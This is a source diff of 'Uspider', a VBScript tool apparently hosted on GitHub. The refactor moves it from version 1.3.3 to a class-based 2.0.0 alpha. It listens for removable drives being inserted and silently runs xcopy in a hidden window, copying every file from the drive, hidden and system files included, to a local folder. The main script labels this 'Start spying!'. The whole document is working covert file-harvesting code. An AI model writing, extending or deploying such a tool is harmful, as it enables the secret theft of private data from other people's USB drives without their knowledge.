@@ -1,130 +1,167 @@
-' Uspider v1.3.3 by jimmy19990
-' ==========================
+' Uspider v2.0.0.alpha by jimmy19990
+' ====================================
+' The brand new Uspider, more classy than ever.
 ' With great might comes great responsibility. DO NOT BE EVIL.
+' Lincensed under MIT License.
 ' URL: https://github.com/jimmy19990/USpider.vbs
-'
-' -------------------
-' Configurations
-' -------------------
-'
-' Logging
-'
-' Set this option to "true" if you want logs.
-'
-private const logging = false
-'
-' Destination Folder
-'
-' "destFolder" defines the destination folder where Uspider will store the copied files.
-private const destFolder = "D:\USpider"
 
-' "separateFolders" tells Uspider whether you would like to store files from different devices into different subfolders.
-' The subfolders will be named of the device's Volume Serial Number (obtained from Win32_LogicalDisk Class).
-private const separateFolders = true
+Class Uspider
+    Private objFileSystem, objWMIService, objWScriptShell, colEvents
+    Private bool_logging, string_destFolder, bool_separateFolders, string_xcopyParameters, bool_isBlackList, string_customList
+    
+    ' Get parameters.
+    Public Property Let logging(logOpt)
+        bool_logging = logOpt
+    End Property
+ 
+    Public Property Let destFolder(destFolderOpt)
+        string_destFolder = destFolderOpt
+    End Property
+    
+    Public Property Let separateFolders(separateFoldersOpt)
+        bool_separateFolders = separateFoldersOpt
+    End Property
+    
+    Public Property Let xcopyParameters(xcopyParametersOpt)
+        string_xcopyParameters = xcopyParametersOpt
+    End Property
+    
+    Public Property Let isBlackList(isBlackListOpt)
+        bool_isBlackList = isBlackListOpt
+    End Property
+    
+    Public Property Let customList(customListOpt)
+        string_customList = customListOpt
+    End Property
+    
+    Private Sub Class_Initialize() 
+        Set objFileSystem = CreateObject("Scripting.FileSystemObject")
+        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+        Set objWScriptShell = CreateObject("WScript.Shell")
+        Set colEvents = objWMIService.ExecNotificationQuery _
+            ("Select * From __InstanceOperationEvent Within 10 Where " _
+                & "TargetInstance isa 'Win32_LogicalDisk'")
+    End Sub
 
-' Xcopy Parameters
-'
-' You can set whatever parameters you want to use with xcopy.
-' Execute "xcopy /?" in Command Prompt for more information.
-private const xcopyParameters = "/e /r /y /h"
+    Private Sub Class_Terminate() 
+        Set objFileSystem = Nothing
+        Set objWMIService = Nothing
+        Set objWScriptShell = Nothing
+        Set colEvents = Nothing
+    End Sub
+    
+    Private Function checkList(objTargetDevice)
+        ' Check if the device is in custom list.
+        isIncluded = false
+        If IsEmpty(bool_isBlackList) = false and IsEmpty(string_customList) = false Then
+            If InStr(string_customList, objTargetDevice.VolumeSerialNumber) > 0 Then
+                isIncluded = true
+            End If
+                        
+            log "Custom List Found! isIncluded = " & isIncluded
 
-' Custom List
-'
-' Uspider allows you to create custom lists to include/exclude certain devices.
-' 
-' "isBlacklist" defines the type of the list.
-' Set it to "true" if you want a Black List, so that ONLY files inside the listed devices WILL BE copied.
-' Set it to "false" if you want a White List, so that files inside the listed devices will NOT be copied.
-private const isBlackList = false
-
-' "customList" is an array which stores the Volume Serial Number.
-' "VolumeSerialNumber" is declared in "Win32_LogicalDisk" Class.
-' You can use a simple script I created (getVolumeSN.vbs) to obtain Volume Serial Numbers for all of your devices.
-' To learn more about "Win32_LogicalDisk", please visit: https://msdn.microsoft.com/en-us/library/aa394173(v=vs.85).aspx.
-customList = array("")
-
-'
-' -------------------
-' Main Script
-' -------------------
-
-' Initialize Objects
-strComputer = "." 
-Set objFileSystem = CreateObject("Scripting.FileSystemObject")
-Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-Set objWScriptShell = CreateObject("WScript.Shell")
-Set colEvents = objWMIService.ExecNotificationQuery _
-    ("Select * From __InstanceOperationEvent Within 10 Where " _
-        & "TargetInstance isa 'Win32_LogicalDisk'")
-
-' Initialize Destination Folder.
-If objFileSystem.folderExists(destFolder) = false Then
-    objFileSystem.CreateFolder destFolder
-End If
-
-' Initialize logging.
-If logging = true Then
-    If objFileSystem.FileExists("Uspider_log.txt") = false Then
-        Set objLogFile = objFileSystem.CreateTextFile("Uspider_log.txt")
+             If isIncluded = bool_isBlackList Then
+                log "Files on this device will be copied..."
+                checkList = true
+            Else
+                log "Files on this device will not be copied..."
+                checkList = false
+            End If
+        Else
+            log "No list is detected. Skip checking..."
+            checkList = true
+        End If
+    End Function
+    
+    Private Function xcopy(objTargetDevice, destDir)
+        ' Initialize Destination Folder.
+        If objFileSystem.folderExists(destDir) = false Then
+            objFileSystem.CreateFolder destDir
+        End If
+        
+        ' Initialize Work Folder.
+        If bool_separateFolders = true Then
+            workFolder = destDir + "\" + objTargetDevice.VolumeSerialNumber
+        Else
+            workFolder = destDir
+        End If
+                        
+        If objFileSystem.folderExists(workFolder) = false Then
+            objFileSystem.CreateFolder workFolder
+        End If
+        
+        copyCommand = "cmd.exe /c xcopy " + objTargetDevice.DeviceId + "\* " + workFolder + " " + string_xcopyParameters
+        objWScriptShell.Run(copyCommand), 0, false
+        
+        log "Copying Thread Started. Command: " & copyCommand
+    End Function
+    
+    Private Function log(logText)
+        ' Check if bool_logging is on.
+        If bool_logging <> true Then
+            Exit Function
+        End If
+        
+        ' Initialize bool_logging.
+        If objFileSystem.FileExists("Uspider_log.txt") = false Then
+            Set objLogFile = objFileSystem.CreateTextFile("Uspider_log.txt")
+            objLogFile.Close
+        End If
+        
+        Set objLogFile = objFileSystem.OpenTextFile("Uspider_log.txt", 8, True)
+        
+        objLogFile.Write("[" & Now & "] " & logText) & vbcrlf
+        
         objLogFile.Close
-    End If
+    End Function
     
-    Set objLogFile = objFileSystem.OpenTextFile("Uspider_log.txt", 8, True)
-    
-    objLogFile.Write("[" & Now & "] " & "Uspider is now started...") & vbcrlf
-End If
-
-Do While True
-    Set objEvent = colEvents.NextEvent
-    
-    ' Check if the target device type is Removable Device (DriveType = 2).
-    If objEvent.TargetInstance.DriveType = 2 Then
-        Select Case objEvent.Path_.Class
-            ' Insert
-            Case "__InstanceCreationEvent"
+    Private Function watchDog()
+        log "Uspider is now started..."
+        Do While True
+            Set objEvent = colEvents.NextEvent
+            Set objTargetDevice = objEvent.TargetInstance
             
-                If logging = true Then
-                    objLogFile.Write("[" & Now & "] " & "New Device Inserted. DeviceID: " & objEvent.TargetInstance.DeviceId & _
-                    " | Label: " & objEvent.TargetInstance.VolumeName & " | SN:" & objEvent.TargetInstance.VolumeSerialNumber) & vbcrlf
-                End If
-                
-                ' Check if the device is in custom list.
-                isIncluded = false
-                If VarType(customList) = 8204 Then
-                    If InStr(Join(customList, "|"), objEvent.TargetInstance.VolumeSerialNumber) > 0 Then
-                        isIncluded = true
-                    End If
-                    If logging = true Then
-                        objLogFile.Write("[" & Now & "] " & "isIncluded = " & isIncluded) & vbcrlf
-                    End If
-                End If
-                
-                If isIncluded = isBlackList Then
-                    ' Initialize Work Folder.
-                    If separateFolders = true Then
-                        workFolder = destFolder + "\" + objEvent.TargetInstance.VolumeSerialNumber
-                    Else
-                        workFolder = destFolder
-                    End If
-                    
-                    If objFileSystem.folderExists(workFolder) = false Then
-                        objFileSystem.CreateFolder workFolder
-                    End If
-                    
-                    ' Copy All Files.
-                    copyCommand = "cmd.exe /c xcopy " + objEvent.TargetInstance.DeviceId + "\* " + workFolder + " " + xcopyParameters
-                    objWScriptShell.Run(copyCommand), 0
-                    If logging = true Then
-                        objLogFile.Write("[" & Now & "] " & "Copying Thread Started. From " & objEvent.TargetInstance.DeviceId & "\ to " & workFolder) & vbcrlf
-                    End If
-                End If
-                
-            ' Remove
-            Case "__InstanceDeletionEvent"
-                If logging = true Then
-                    objLogFile.Write("[" & Now & "] " & "Device Removed. DeviceID: " & objEvent.TargetInstance.DeviceId & _
-                    " | Label: " & objEvent.TargetInstance.VolumeName & " | SN:" & objEvent.TargetInstance.VolumeSerialNumber) & vbcrlf
-                End If 
-        End Select
-    End If
-Loop
+            ' Check if the target device type is Removable Device (DriveType = 2).
+            If objTargetDevice.DriveType = 2 Then
+                Select Case objEvent.Path_.Class
+                    ' Insert
+                    Case "__InstanceCreationEvent"
+                                
+                        log "New Device Inserted. DeviceID: " & objTargetDevice.DeviceId & _
+                            " | Label: " & objTargetDevice.VolumeName & " | SN:" & objTargetDevice.VolumeSerialNumber
+
+                        If checkList(objTargetDevice) = true Then
+                            xcopy objTargetDevice, string_destFolder
+                        End If
+                        
+                    ' Remove
+                    Case "__InstanceDeletionEvent"
+                        log "Device Removed. DeviceID: " & objTargetDevice.DeviceId & _
+                            " | Label: " & objTargetDevice.VolumeName & " | SN:" & objTargetDevice.VolumeSerialNumber
+                End Select
+            End If
+        Loop
+    End Function
+    
+    Public Function Init()
+        log "Initialization Finished."
+        watchDog()
+    End Function
+End Class
+
+' --------------------
+'  Main Script
+' --------------------
+
+Set Spyer = New Uspider
+
+' Configurations
+Spyer.logging = true
+Spyer.destFolder = "D:\Uspider"
+Spyer.separateFolders = true
+Spyer.xcopyParameters = "/d /e /r /y /h"
+Spyer.isBlackList = false
+Spyer.customList = ""
+
+' Start spying!
+Spyer.Init()
